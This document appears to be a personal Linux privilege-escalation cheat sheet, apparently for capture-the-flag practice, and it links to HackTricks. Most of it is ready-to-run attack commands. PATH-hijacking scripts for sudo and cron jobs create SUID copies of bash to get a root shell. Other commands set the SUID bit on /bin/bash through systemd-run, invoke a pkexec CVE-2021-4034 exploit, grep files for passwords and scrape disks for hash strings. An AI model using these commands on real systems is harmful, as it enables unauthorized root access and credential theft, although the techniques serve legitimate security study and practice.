---
icon: linux
---

# Linux Privilege Scalation

* ## <mark style="color:purple;">Get your own local version of this checklist</mark> [<mark style="color:purple;">here</mark>](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/refs/heads/master/linux-hardening/linux-privilege-escalation-checklist.md)<mark style="color:purple;">:</mark>

{% embed url="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" %}
By Carlos Palop
{% endembed %}

***

{% hint style="info" %}
## <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking</mark>

* <mark style="color:purple;">When a script is executed with elevated privileges (e.g., via</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">or in a</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job) and calls other binaries or scripts without absolute paths, it may be possible to hijack the execution flow by manipulating the</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**`PATH`**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">variable or exploiting relative paths.</mark>

***

### <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking with</mark> <mark style="color:orange;">`sudo`</mark>

{% code title="Lists allowed commands" %}
```bash
sudo -l
```
{% endcode %}

* <mark style="color:purple;">Sometimes is possible to run scripts as</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">that call others scripts within the script.</mark>
* <mark style="color:purple;">When this scripts are called by a relative path is possible to create a malicious script on a directory with write permissions.</mark>
* <mark style="color:purple;">This commands creates a script called</mark> <mark style="color:orange;">**`initdb.sh`**</mark> <mark style="color:purple;">that well called will copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to a file called</mark> <mark style="color:purple;"></mark>_<mark style="color:purple;">**shellie**</mark>_ <mark style="color:purple;"></mark><mark style="color:purple;">in the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder:</mark>

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/shellie\nchown root:root /tmp/shellie\nchmod 6777 /tmp/shellie' | tee initdb.sh
```

* <mark style="color:purple;">Once the  malicious script is executed by the vulnerable script, you just need to execute the shell from the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder to become</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">:</mark>

```bash
/tmp/shellie -p
```

***

### <mark style="color:purple;">Path Hijacking in</mark> <mark style="color:orange;">`cron`</mark> <mark style="color:purple;">job</mark>

* <mark style="color:purple;">When</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">includes</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark> <mark style="color:purple;">before</mark> <mark style="color:orange;">**`/usr/bin`**</mark> <mark style="color:purple;">in the</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job's environment.</mark>&#x20;
* <mark style="color:purple;">There is an opportunity for</mark> <mark style="color:orange;">**`PATH hijacking`**</mark> <mark style="color:purple;">if a binary or script is executed</mark> <mark style="color:orange;">**`without using an absolute path`**</mark><mark style="color:purple;">**.**</mark>
* <mark style="color:purple;">By placing a malicious binary in a directory earlier in the</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">(e.g.,</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark><mark style="color:purple;">), you can hijack the execution flow.</mark>

```sh
echo -e '#!/bin/bash\n\ncp /bin/bash /bin/shellie\nchmod u+s /bin/shellie' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```

* <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">drops</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">privileges by default, so make sure to run it with</mark> <mark style="color:orange;">**`-p`**</mark> <mark style="color:purple;">to keep root:</mark>

```bash
shellie -p
```
{% endhint %}

















Netstat

```bash
#Option 1
netstat -l

#Ports
netstat -nltp

#More
netstat -rn
```

Look for files

```bash
#SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -or -perm -2000 2>/dev/null
#Binaries con capabilities
getcap -r / 2>/dev/null

#Extra info about bin process 
**getfacl** 

#Passwords
grep -iR "pass" *
grep password .*.* -r
#File
grep -ir cri-o . 2>/dev/null

#Look for a specific file
find / -name lcars 2>/dev/null
find / -name root.txt 2>/dev/null

#Inside a file
cat /etc/zabbix/zabbix_server.conf | grep -Ev "^#" | grep .

#Check libraries
ltrace

#Looking for 32 characters file
#hex
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
#string 32 chars
strings /dev/sdb -n 32
```

User Privileges

```bash
Check user root privileges â€”> sudo -l
```

Port Forwarding

```bash
ssh -L {TARGETPORT}:127.0.01:8000 [sau@](<mailto:sau@10.10.11.214>){TARGETIP}
```

Symbolic Link

```bash
ln -s /root/root.txt t.trace.db
```

Common Vectors

```bash
#systemd-run + bash -p
systemd-run chmod u+s /bin/bash
bash -p

#pkexec
python3 CVE-2021-4034.py
```

Flash drives

```bash
#Enumerate mounted disks
mount
#more
lsblk
```

SUDO

```bash
#Interective shell
sudo -i
#su vuln
sudo su -
```

